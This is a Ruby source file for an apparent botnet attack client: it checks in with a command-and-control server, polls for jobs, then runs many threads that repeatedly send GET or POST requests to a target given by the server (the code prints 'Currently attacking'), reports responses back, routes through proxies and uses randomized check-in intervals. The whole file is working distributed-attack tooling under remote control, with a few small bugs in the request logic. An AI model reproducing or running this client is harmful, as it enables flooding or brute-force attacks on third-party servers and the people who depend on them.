class Client
	def initialize(server, thread_count, proxy_host, proxy_port)
		@server = server + "/api"
		@proxy_host = proxy_host
		@proxy_port = proxy_port
		@has_job = false
		@thread_count = thread_count

		@job_id = 0
		@http_method = ""
		@http_uri = ""
		@http_host = ""
		@http_headers = ""
		@http_data = ""
		@node_id = mac_address
	end

	def invoke
		# Make sure we can reach C&C
		cc_stability_test

		puts "(+) Polling for Job..."
		while @has_job == false
			# Poll
			job = request_job
			
			@has_job = true if job
		end

		@job_id 		= job["id"]
		@http_method 	= job["http_method"]
		@http_uri 		= job["http_uri"]
		@http_host 		= job["http_host"]
		@http_headers 	= parse_headers(Base64.decode64(job["http_headers"]))
		@http_data 		= parse_data(Base64.decode64(job["http_data"]))

		# should probably start computing...
		kick_off_job!
	end

	def request_job
		endpoint = @server + "/poll/#{@node_id}"

		response = Mechanize.new.get(endpoint)
		# Parse response
		response_parsed = JSON.parse(response.body)
		
		if response_parsed["status"] == "active"
			return response_parsed
		else
			# Failed, but let's sleep
			random_sleep_time = random_polling_interval
			puts "Sleeping for #{random_sleep_time} seconds"
			sleep(random_sleep_time)
			return false
		end
	end

	def kick_off_job!
		puts "(+) Job recieved. Kicking it off with #{@thread_count} threads"
		puts "(+) Currently attacking: #{@http_uri}"
		monitor_thread_id = @thread_count + 1

		job_threads = (1..monitor_thread_id).map do |i|
			Thread.new(i) do |i|
				if i == monitor_thread_id
					while @has_job
						monitor_job_status
					end
				else
					while @has_job
						send_request
					end
				end
			end
		end

		job_threads.each {|t| t.join }

		puts "(+) Job has been stopped by C&C"
		puts "(+) Beginning search for new job"
		invoke
	end

	def send_request
		req = Mechanize.new.tap do |r|
			if @proxy_host
				r.set_proxy(@proxy_host, @proxy_port)
			end
		end

		# Set these if they weren't passed in...
		http_uri ||= @http_uri
		http_data ||= @http_data
		http_headers ||= @http_headers

		attack_mode = 'store'

		if @http_method.downcase == "get"
			begin
				response = req.get(http_uri)

				store_response(response) if attack_mode == 'store'
				puts "Unable to connect with get."
			end
		else
			begin
				response = req.post(http_uri, http_data, http_headers)

				store_response(response) if attack_mode == 'store'
			rescue
				puts "Unable to connect with post."
			end
		end
	end

	def store_response(response)
		endpoint = "#{@server}/job/#{@job_id}/saveResponse"

		data = { 
			:response => Base64.encode64(response.body),
			:code 		=> response.code.to_i
		}
		begin
		Mechanize.new.post(endpoint, data)
		rescue
			# hmm
		end
	end

	# Communicates with C&C behind the scenes to look for job status changes

	def monitor_job_status
		# Let's sleep for a bit first
		random_sleep_time = random_polling_interval
		puts "Sleeping for #{random_sleep_time} seconds"
		sleep(random_sleep_time)

		puts "Checking job status for job #{@job_id} on node #{@node_id}"
		endpoint = "#{@server}/poll/#{@node_id}/#{@job_id}"

		begin
			response = Mechanize.new.get(endpoint)
			# Parse response
			response_parsed = JSON.parse(response.body)
			
			if response_parsed["status"] == "active"
				return response_parsed
			else
				@has_job = false
				return false
			end
		rescue
			# Ehh, let it slide for now.
			# Eventually there should be an error counter that kills
			# jobs based on a certain number of unsuccessful attempts
		end
	end

	def cc_stability_test
		# Check status to C&C
		req = Mechanize.new.tap do |r|
			if @proxy_host
				r.set_proxy(@proxy_host, @proxy_port)
			end
		end

		response = req.head(@server + "/health")

		if response.code.to_i >= 400
			puts "(!) Unable to communicate with command and control server"
			puts "(!) Please confirm address: #{@server}"
			exit
		end
	end

	def random_polling_interval
		13 + rand(64)
	end

	# Split data by & and =, returning hash
	def parse_data(data)
		return URI.decode_www_form(data)
	end

	def parse_headers(headers)
		header_hash = {}

		lines = headers.split("\n")

		lines.each do |line|
			split_line = line.split(":", 2)
			h = Hash[*split_line]
			header_hash.merge!(h)
		end

		return header_hash
	end

	def mac_address
	  platform = RUBY_PLATFORM.downcase
	  output = `#{(platform =~ /win32/) ? 'ipconfig /all' : 'ifconfig'}`
	  case platform
	    when /darwin/
	      $1 if output =~ /en1.*?(([A-F0-9]{2}:){5}[A-F0-9]{2})/im
	    when /win32/
	      $1 if output =~ /Physical Address.*?(([A-F0-9]{2}-){5}[A-F0-9]{2})/im
	    # Cases for other platforms...
	    else nil
	  end
	end
end